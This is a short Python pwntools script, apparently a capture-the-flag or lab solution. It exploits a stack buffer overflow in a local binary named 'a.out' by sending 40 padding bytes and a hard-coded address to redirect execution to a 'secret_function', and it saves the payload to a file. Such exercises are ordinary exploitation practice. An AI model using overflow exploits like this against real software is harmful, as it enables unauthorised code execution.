from pwn import *

p = process("a.out")

p.recvuntil("Enter some text:")

secret_function = 0x0000555555555159

p.send("A"*40)

p.sendline(p64(secret_function))

with open("shellcode.bin","wb") as f:
    f.write("A"*40)
    f.write(p64(secret_function))
    f.write("\n")

p.interactive()